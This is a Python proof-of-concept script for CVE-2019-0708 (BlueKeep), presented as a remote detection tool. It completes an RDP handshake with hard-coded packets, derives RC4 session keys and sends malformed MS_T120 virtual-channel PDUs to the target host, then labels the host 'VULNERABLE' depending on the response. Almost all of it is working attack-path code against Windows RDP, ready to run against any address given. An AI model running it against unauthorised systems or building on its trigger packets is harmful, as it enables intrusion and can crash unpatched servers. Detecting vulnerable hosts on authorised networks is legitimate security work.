#CVE-2019-0708
#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/e78db616-689f-4b8a-8a99-525f7a433ee2
#https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPBCGR/%5bMS-RDPBCGR%5d.pdf
# Write by Closethe
# Thanks Mateusz Garncarek ,360

import socket
import sys
import struct
import random
import getopt,traceback
import datetime,time
from common import macData,SaltedHash,RC4,finalHash

req = b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00"
req += b"\x00\x00\x00"

clientData = b"\x03\x00\x01\x88\x02\xf0\x80\x7f\x65\x82\x01\x7c\x04\x01\x01\x04"
clientData += b"\x01\x01\x01\x01\xff\x30\x19\x02\x01\x22\x02\x01\x02\x02\x01\x00"
clientData += b"\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02"
clientData += b"\x30\x19\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01"
clientData += b"\x00\x02\x01\x01\x02\x02\x04\x20\x02\x01\x02\x30\x1c\x02\x02\xff"
clientData += b"\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x01\x01\x02\x01\x00\x02"
clientData += b"\x01\x01\x02\x02\xff\xff\x02\x01\x02\x04\x82\x01\x1b\x00\x05\x00"
clientData += b"\x14\x7c\x00\x01\x81\x12\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75"
clientData += b"\x63\x61\x81\x04\x01\xc0\xd8\x00\x04\x00\x08\x00\x00\x01\x00\x01"
clientData += b"\x01\xca\x03\xaa\x04\x09\x00\x00\xce\x0e\x00\x00\x72\x64\x70\x79"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00"
clientData += b"\x20\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
clientData += b"\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x02\xc0\x0c\x00"
clientData += b"\x1b\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x20\x00\x02\x00\x00\x00"
clientData += b"\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00\x64\x72\x64\x79"
clientData += b"\x6e\x76\x63\x00\x00\x00\x00\x00"

packet1 = b"\x03\x00\x00\x0c\x02\xf0\x80\x04\x01\x00\x01\x00"

packet2 = b"\x03\x00\x00\x08\x02\xf0\x80\x28"

packet3 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x05\x03\xee"

packet4 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x05\x03\xeb"

packet5 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x05\x03\xec"

packet6 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x05\x03\xed"

packet7 = b"\x03\x00\x00\x5e\x02\xf0\x80\x64\x00\x05\x03\xeb\x70\x50\x01\x00"
packet7 += b"\x00\x00\x48\x00\x00\x00\x1a\xe3\xa4\x4f\x0e\xe2\x35\x66\x09\xb9"
packet7 += b"\x84\x9d\xb6\x82\xd9\x45\x9d\x2e\xd1\x1a\x5f\xc4\x9f\x78\x70\x15"
packet7 += b"\x7f\x35\x4c\x12\xa2\xaf\x33\xdd\x4c\x7f\x59\x75\x59\x24\xd6\xe5"
packet7 += b"\x86\xcb\x09\x0d\xc6\x92\xba\xe7\x28\x08\x4c\x12\xaf\x1e\x10\x38"
packet7 += b"\xf2\xec\xdc\x40\xf9\x3c\x00\x00\x00\x00\x00\x00\x00\x00"

packet8 = b"\x03\x00\x00\x32\x02\xf0\x80\x64\x00\x05\x03\xeb\x70\x24\x48\x00"
packet8 += b"\x00\x00"

packet9 = b"\x03\x00\x01\x24\x02\xf0\x80\x64\x00\x05\x03\xeb\x70\x81\x15\x08"
packet9 += b"\x00\x00\x00"

packet10 = b"\x03\x00\x00\x2c\x02\xf0\x80\x64\x00\x05\x03\xeb\x70\x1e\x08\x00"
packet10 += b"\x00\x00"

packet11 = b"\x03\x00\x00\x34\x02\xf0\x80\x64\x00\x05\x03\xeb\x70\x26\x08\x00"
packet11 += b"\x00\x00"

packet12 = b"\x03\x00\x00\x32\x02\xf0\x80\x64\x00\x05\x03\xec\x70\x24\x08\x00"
packet12 += b"\x00\x00"



def poc(host,port,vul):
    socket.setdefaulttimeout(20)
    received_data = ""
    client_random = random.randint(1991,9999)
    client_random = client_random.to_bytes(32, byteorder='little')
    print("[+] Connecting to RDP server.")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception as e:
        print("[!] Socket :",e)
        raise e
    print("[+] Establlish connection with RDP server successful.")
    s.send(req)
    received_data  = s.recv(1024)
    s.send(clientData)
    received_data  = s.recv(10024)
    # get ServerSecurityData
    server_random = received_data[0x71:0x91]
    modulus = received_data[0xb5:0xf5]
    public_exponent =  received_data[0xb1:0xb5]
    #print("text:   {}".format(':'.join(hex(x)[2:] for x in server_random)))
    #print("text:   {}".format(':'.join(hex(x)[2:] for x in modulus)))
    #print("text:   {}".format(':'.join(hex(x)[2:] for x in public_exponent)))
    # join channel 
    s.send(packet1)
    s.send(packet2)
    received_data  = s.recv(1024)
    s.send(packet3)
    received_data  = s.recv(1024)
    s.send(packet4)
    received_data  = s.recv(1024)
    s.send(packet5)
    received_data  = s.recv(1024)
    s.send(packet6)
    received_data  = s.recv(1024)
    # calc client random
    modulus = int.from_bytes(modulus, byteorder='little')
    public_exponent = int.from_bytes(public_exponent, byteorder='little')
    client_random = int.from_bytes(client_random, byteorder='little')
    encrypted_client_random = pow(client_random,public_exponent,modulus )
    encrypted_client_random  = encrypted_client_random.to_bytes(64, byteorder='little')
    #send client random
    s.send(packet7[:22] + encrypted_client_random + packet7[-8:])
    client_random  = client_random.to_bytes(32, byteorder='little')
    client_random = "".join(map(chr, client_random))
    server_random = "".join(map(chr, server_random))
    #Calculating hashes and things for RC4 encryption it's only done for 128BIT RC4
    PreMasterSecret = client_random[:24] + server_random[:24]
    MasterSecret = SaltedHash(PreMasterSecret,"A",client_random,server_random) +  SaltedHash(PreMasterSecret,"BB",client_random,server_random) + SaltedHash(PreMasterSecret,"CCC",client_random,server_random)
    MasterSecret = "".join(map(chr, MasterSecret))
    SessionKeyBlob = SaltedHash(MasterSecret,"X",client_random,server_random) +  SaltedHash(MasterSecret,"YY",client_random,server_random) + SaltedHash(MasterSecret,"ZZZ",client_random,server_random)
    FinalClientEncryptKey128 = SessionKeyBlob[32:48]
    FinalClientEncryptKey128 = finalHash(FinalClientEncryptKey128,client_random,server_random)
    FinalClientDecryptKey128 = SessionKeyBlob[16:32]
    FinalClientDecryptKey128 = finalHash(FinalClientDecryptKey128,client_random,server_random)
    FinalClientDecryptKey128 = "".join(map(chr, FinalClientDecryptKey128))
    FinalClientEncryptKey128 = "".join(map(chr, FinalClientEncryptKey128))
    MACKey128 = SessionKeyBlob[:16]
    rcEnc = RC4(FinalClientEncryptKey128)
    rcDec = RC4(FinalClientDecryptKey128)
    t1 = b"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    mac = macData(MACKey128, t1)[:8]
    packet_to_encrypt = "".join(map(chr, t1))
    encrypted_packet = rcEnc.enc(packet_to_encrypt)
    encrypted_packetb = bytearray()
    encrypted_packetb.extend(map(ord, encrypted_packet))
    #print("text:   {}".format(':'.join(hex(x)[2:] for x in packet8 +mac+encrypted_packetb )))
    s.send(packet8 +mac+encrypted_packetb )
    received_data  = s.recv(1024)
    received_data  = s.recv(1024)
    t1 = b"\x03\x01\x03\x00\xeb\x03\xea\x03\x01\x00\xea\x03\x05\x00\xf4\x00\x4d\x53\x54\x53\x43\x05\x00\x00\x00\x01\x00\x18\x00"
    t1 += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0d\x00\x58\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"
    t1 += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    t1 += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    t1 += b"\x00\x00\x00\x00\x00\x00\x00\x02\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00"
    t1 += b"\x00\x00\x03\x00\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    t1 += b"\x00\x00\x00\x0a\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    t1 += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x00\x00\x00\x00\x19\x00\x00\x00"
    #print(len(t1))
    mac = macData(MACKey128, t1)[:8]
    packet_to_encrypt = "".join(map(chr, t1))
    encrypted_packet = rcEnc.enc(packet_to_encrypt)
    encrypted_packetb = bytearray()
    encrypted_packetb.extend(map(ord, encrypted_packet))
    s.send(packet9 +mac+encrypted_packetb )
    received_data  = s.recv(1024)
    t1 = b"\x0c\x00\x07\x00\xeb\x03\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00"
    mac = macData(MACKey128, t1)[:8]
    packet_to_encrypt = "".join(map(chr, t1))
    encrypted_packet = rcEnc.enc(packet_to_encrypt)
    encrypted_packetb = bytearray()
    encrypted_packetb.extend(map(ord, encrypted_packet))
    s.send(packet10 +mac+encrypted_packetb )
    received_data  = s.recv(1024)
    t1 = b"\x14\x00\x07\x00\xeb\x03\x00\x00\x00\x00\x00\x00\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
    mac = macData(MACKey128, t1)[:8]
    packet_to_encrypt = "".join(map(chr, t1))
    encrypted_packet = rcEnc.enc(packet_to_encrypt)
    encrypted_packetb = bytearray()
    encrypted_packetb.extend(map(ord, encrypted_packet))
    s.send(packet11 +mac+encrypted_packetb )
    received_data  = s.recv(10024)
    dt = datetime.datetime.now()
    while datetime.datetime.now() < dt+datetime.timedelta(seconds=15):
        recv = s.recv(10024)
        time.sleep(0.1)
    # 4.4 Annotated Server-to-Client Virtual Channel PDU
    #The following is an annotated dump of the Virtual Channel PDU (section 2.2.6.1) that was exchanged
    #between a Microsoft RDP 5.1 client and Microsoft RDP 5.1 server.
    vul1 = b"\x10\x00\x00\x00\x03\x00\x00\x00\x03\x03\x03\x03\x02\x00\x00\x00\x03\x03\x03\x03\x00\x00\x00\x00"
    vul2 = b"\x20\x00\x00\x00\x03\x00\x00\x00\x03\x03\x03\x03\x03\x03\x03\x03\x02\x00\x00\x00\x00\x00\x00\x00\x03\x03\x03\x03\x03\x03\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00"
    if vul ==1:
        t1 = vul1
        packet12 = b"\x03\x00\x00\x32\x02\xf0\x80\x64\x00\x05\x03\xec\x70\x24\x08\x00"
        packet12 += b"\x00\x00"
    else:
        t1 = vul2
        packet12 = b"\x03\x00\x00\x42\x02\xf0\x80\x64\x00\x05\x03\xec\x70\x24\x08\x00"
        packet12 += b"\x00\x00"
    mac = macData(MACKey128, t1)[:8]
    packet_to_encrypt = "".join(map(chr, t1))
    encrypted_packet = rcEnc.enc(packet_to_encrypt)
    encrypted_packetb = bytearray()
    encrypted_packetb.extend(map(ord, encrypted_packet))
    s.send(packet12 +mac+encrypted_packetb )
    received_data  = s.recv(1024)
    #print("text:   {}".format(':'.join(hex(x)[2:] for x in received_data )))
    if len(received_data) < 10:
        return True
    else:
        s.close()
        return False

    

def usage():
    print(
"""
Usage:
    python poc.py -t 127.0.0.1 -p 3389

    -t or --target：Host IP
    -p or --port：RDP Port

"""
    )





if __name__ == "__main__":
    print("CVE-2019-0708 Remote Detection tool")
    print("                      by: closethe")
    print("")

    if len(sys.argv) == 1:
        usage()
        sys.exit(1)

    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:p:")  
    except getopt.GetoptError:
        usage()
        import traceback
        traceback.print_exc()
        sys.exit(1)
    for cmd, arg in opts: 
        if cmd in ("-t", "--target"):
            host = arg
        elif cmd in ("-p", "--port"):
            port = arg
            

    try:
        ret = poc(host,int(port,10),1)
        if ret:
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
            print("!!!!!!!    VULNERABLE    !!!!!!!!")
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        else:
            print("[+] Start 2nd stage detection.")
            ret = poc(host,int(port,10),2)
            if ret:
                print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
                print("!!!!!!!    VULNERABLE    !!!!!!!!")
                print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
            else:
                print("server likely NOT vulnerable.")
    except Exception as e:
        traceback.print_exc()
